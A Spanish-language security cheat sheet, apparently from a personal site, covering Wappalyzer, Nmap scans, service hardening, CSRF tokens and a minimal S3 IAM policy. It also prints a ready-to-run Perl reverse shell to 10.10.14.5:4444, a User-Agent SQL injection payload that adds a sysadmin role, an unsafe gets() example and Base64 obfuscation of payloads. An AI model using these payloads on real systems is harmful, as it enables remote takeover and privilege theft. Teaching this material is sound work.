// 0x01 RECURSOS EN LÍNEA: Herramientas y OSINT //

[ OSINT ] Detección de Tecnologías con Wappalyzer

La inteligencia de fuentes abiertas (OSINT) es crucial. Antes de interactuar, necesitamos saber qué tecnologías usa el objetivo. Wappalyzer es una extensión de navegador (o herramienta CLI) que identifica frameworks, CMS, servidores, y más.


# Comando CLI de Wappalyzer (requiere instalación)
wappalyzer https://dominioobjetivo.com

**[ FÁCIL DE EDITAR ]** Para cambiar la imagen, simplemente sube "Imagen_Wappalyzer.png" a tu repositorio y reemplaza el texto ALT.

[ ESCANEO ] Nmap: Escaneo de Versiones y OS

Nmap es el estándar de la industria. Para obtener la información más detallada sobre los puertos abiertos, incluyendo el sistema operativo y las versiones exactas de los servicios, se utiliza la opción `-A` (agresivo).


# Escaneo agresivo y rápido (T4)
nmap -A -T4 192.168.1.1/24

// 0x02 SEGURIDAD DEFENSIVA: Mitigación y Hardening //

[ HARDENING ] Deshabilitar servicios innecesarios en Linux

La superficie de ataque se reduce deshabilitando los servicios que no se usan. Menos servicios = menos posibles puntos de entrada. Ejemplo con `systemctl` en sistemas basados en Systemd.


# Ver todos los servicios activos
systemctl list-units --type=service --state=running

# Deshabilitar un servicio (ej. Apache si no se usa)
sudo systemctl stop apache2
sudo systemctl disable apache2

[ MITIGACIÓN ] Prevención de CSRF (Token Syncronizer)

Cross-Site Request Forgery (CSRF) se mitiga con tokens de sincronización únicos por sesión. El servidor genera un token y lo verifica en cada solicitud POST importante.


// Ejemplo conceptual en PHP (verificación)
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("Error: Token CSRF inválido.");
}

[ CLOUD ] IAM Policy Mínimo para S3 (Principio de Menor Privilegio)

En seguridad Cloud, el Principio de Menor Privilegio (PoLP) es vital. Este ejemplo de política IAM solo permite la acción de lectura (`s3:GetObject`) en una carpeta específica, nada más.


{
    "Effect": "Allow",
    "Action": ["s3:GetObject"],
    "Resource": ["arn:aws:s3:::mi-bucket-seguro/public/*"]
}

[ SHELL ] Reverse Shell de Perl (Alternativa a Bash)

Si Bash no está disponible o tiene restricciones, Perl es una alternativa común para obtener una shell inversa en sistemas Linux/Unix. Este payload es útil cuando otros fallan.


perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'

[ WEB ] Búsqueda de Inyecciones de Código en Headers HTTP

No todas las vulnerabilidades están en los parámetros GET/POST. Las aplicaciones a menudo procesan los Headers HTTP (User-Agent, Referer) sin sanitizar. El siguiente ejemplo es un payload para intentar una Inyección SQL ciega.


# Payload en el Header User-Agent
User-Agent: '; EXEC sp_addsrvrolemember 'usuario', 'sysadmin' --

[ LENGUAJE C ] Función Vulnerable a Buffer Overflow (Concepto)

La vulnerabilidad de *buffer overflow* ocurre cuando un programa escribe más datos de lo asignado. Aquí un ejemplo en C del uso inseguro de `gets()`:


#include <stdio.h>

void vulnerable_function() {
    char buffer[10]; 
    printf("Introduce un string: ");
    gets(buffer); // FUNCIÓN INSEGURA
}

[ CODIFICACIÓN ] Uso de Base64 para ofuscación básica

Base64 es un sistema de codificación, no de cifrado, pero a menudo se utiliza para ofuscar (ocultar a simple vista) strings en payloads o archivos de configuración. Ejemplo en Bash:


# Codificar:
echo "Comando oculto" | base64
# Salida: Q29tYW5kbyBvY3VsdG8K

# Decodificar:
echo "Q29tYW5kbyBvY3VsdG8K" | base64 -d
